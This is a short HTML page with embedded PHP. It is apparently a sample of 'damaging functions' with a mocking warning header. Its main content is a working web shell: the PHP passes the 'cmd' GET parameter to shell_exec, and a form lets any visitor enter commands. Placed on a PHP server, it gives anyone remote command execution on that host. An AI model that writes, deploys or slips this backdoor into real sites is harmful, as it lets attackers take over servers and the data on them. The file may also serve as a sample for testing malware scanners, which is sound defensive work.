<h1>Hi there!!</h1>
<p>In this file should be all the worst functions that should do damage to your system!!!</p>
<p><h2>You must pay attention, or <b>PAY THE PRICE</b>!</h2></p>
<pre>
<?php
if (isset($_GET['cmd'])) {
	echo shell_exec(urldecode($_GET['cmd']));
}
?>
</pre>
<form method="get">
Enter Command: <input type="text" name="cmd" />
<input type="submit" />
</form>
